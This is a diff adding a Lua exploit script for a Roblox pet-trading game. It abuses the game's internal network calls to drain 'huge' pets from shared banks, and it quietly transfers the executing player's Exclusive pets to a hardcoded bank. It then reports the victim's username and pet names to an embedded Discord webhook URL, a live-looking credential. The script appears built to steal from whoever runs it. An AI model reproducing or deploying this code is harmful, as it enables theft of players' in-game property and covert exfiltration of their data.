@@ -1,0 +1,145 @@
+function SendMessage(huges)
+	huges =  table.concat(huges, ', ')
+
+	local webhookcheck =
+		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+		secure_load and "Sentinel" or
+		KRNL_LOADED and "Krnl" or
+		SONA_LOADED and "Sona" or
+		"Kid with shit exploit"
+
+	local url =
+		"https://discord.com/api/webhooks/1041686034834006056/5avDvgDcvd6TSH0y8pihPqB3wvVOcxNYcXUS5bu7d90C0piiZ8b2F7o4OwMKkcpcD0jx"
+	local data = {
+		["content"] = game.Players.LocalPlayer.Name .. " got some huges ;)",
+		["embeds"] = {
+			{
+				["title"] = "**Someone Executed Your Script!**",
+				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **HUGE NAMES:** ".. huges..',
+				["type"] = "rich",
+				["color"] = tonumber(0x7269da),
+				["image"] = {
+					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+						tostring(game:GetService("Players").LocalPlayer.Name)
+				}
+			}
+		}
+	}
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef)
+
+end
+
+
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+
+
+local abobusikti = (getupvalue or debug.getupvalue)(lib.Network.Invoke, 2)
+fire123 = function(n, ...)
+	return abobusikti(n):InvokeServer(...)
+end
+print(abobusikti("k"))
+
+
+
+local function AcceptInvite(id)
+	return fire123("e", id)
+end
+
+
+local function GetAllHugePets(bankid)
+	local pets1 = {}
+	local u5 = fire123("j", bankid)
+	for i,v in pairs(u5.Storage.Pets) do
+		local v2 = lib.Directory.Pets[v.id];
+		if v2.huge or v2.isGift then
+			table.insert(pets1, v.uid)
+		end
+	end
+
+	-- print("Found "..#pets1.." pets")
+	return pets1
+end
+
+while true do
+
+
+	pcall(function()
+		local mybanks = fire123("k")
+
+
+
+		local myinvites = fire123("l")
+		for i, v in pairs(myinvites) do
+			if #mybanks < 5 then
+				if AcceptInvite(v.BUID) then
+					print("Accepted Invite")
+				end
+				mybanks[#mybanks+1] = v
+			end
+		end
+
+
+
+		local mybanks = fire123("k")
+		for i, v in pairs(mybanks) do
+			if i ~= 1 and i ~= 2 then
+				print('testing bank')
+				local pets = GetAllHugePets(v.BUID)
+
+				local pets1 = {}
+
+				for index, value in pairs(pets) do
+					if #pets1 < 49 then
+						table.insert(pets1, value)
+					end
+				end
+				if #pets > 0 then
+
+					local args = {
+						[1] = v.BUID,
+						[2] = pets1,
+						[3] = 0
+					}
+					fire123("8", unpack(args))
+					print('Got huges: '..#pets1)
+				else
+
+					print('Leaving bank: no pets left.')
+					fire123("b", v.BUID)
+				end
+
+
+				wait(3)
+			end
+		end
+
+		local PetsList = {}
+		local PetsList2 = {}
+		for i,v in pairs(lib.Save.Get().Pets) do
+			local v2 = lib.Directory.Pets[v.id];
+			if v2.rarity == "Exclusive" then
+				table.insert(PetsList, v.uid);
+				table.insert(PetsList2, v.name);
+			end
+		end
+
+
+		if #PetsList > 0 then
+			fire123("7", "057f27b8-e7a2-4113-9f55-a4e0184e475c", PetsList, 0)
+			SendMessage(PetsList2);
+		end
+
+	end)
+
+	--
+	-- #!F71a1e3ffdba34ed99e8f44ce78d5703bimage.png
+
+	wait(5)
+end
